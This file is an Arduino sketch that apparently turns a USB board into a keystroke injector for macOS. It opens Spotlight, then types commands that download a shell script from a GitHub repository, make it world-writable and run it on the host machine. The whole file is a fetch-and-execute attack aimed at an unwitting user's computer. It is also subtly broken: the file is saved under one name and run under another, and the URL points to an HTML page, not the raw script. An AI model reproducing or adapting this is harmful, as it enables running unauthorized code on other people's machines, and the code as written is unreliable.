#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  
  Keyboard.println("curl -L -o ~/upsi.sh 'https://github.com/4n4k1n/Goose/blob/main/setUp.sh'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(10000);

  Keyboard.println("chmod 777 setUp.sh");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(2000);

  Keyboard.println("bash setUp.sh");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
  // Nothing to do here
}
